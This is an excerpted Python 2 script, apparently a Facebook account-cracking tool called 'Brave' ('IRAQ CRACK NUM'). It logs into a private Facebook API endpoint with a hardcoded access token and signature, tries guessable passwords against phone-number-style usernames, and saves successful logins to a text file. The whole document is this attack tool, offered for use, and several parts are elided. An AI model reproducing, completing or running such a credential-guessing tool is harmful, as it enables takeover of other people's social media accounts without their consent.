...
logo = logo ="""
 \033[91m  ____                      
\033[91m  |  _ \                     
\033[93m  | |_) |_ __ __ ___   _____ 
\033[93m  |  _ <| '__/ _` \ \ / / _ \
\033[92m  | |_) | | | (_| |\ V /  __/
\033[92m  |____/|_|  \__,_| \_/ \___|
\033[90m---------------------------------------
Auther : AANG                    
Github : https://github.com/REAAPWE                    
Snap   : @iam_aang
\033[90m---------------------------------------"""

CorrectUsername = 'Brave'
CorrectPassword = 'aang'
os.system('clear')
print logo
loop = 'true'
while loop == 'true':
...
def menu():
    ...
    print '\033[90mIRAQ CRACK NUM \033[92m(free mode) \033[97m'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                pass2 = '0987654321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=EAAAAUaZA8jlABAIfHGfZATJFkDm6EZAt1vXnRu18tYvJ3bJAZAHm4V3WJTuQDFA1Jol3z7rX0zFSRjkOsZATxT2aHpPGS0Ogk4HD8WJK2FvyxYIUIh6xnSLnaGb5zlns8cVLkeoZASanQ6GfMIT41FWE8XdFYLEzYS0IfqlZCxky2AQqgZAnhvBRNC7WA15rf9kZD=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=RuRBY6VBmm94oDuUt')
            q = json.load(data)
            if 'access_token' in q:
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successful]\x1b[1;92m ' + k + c + user + '  ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successful]\x1b[1;92m ' + k + c + user + '  ' + pass6 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
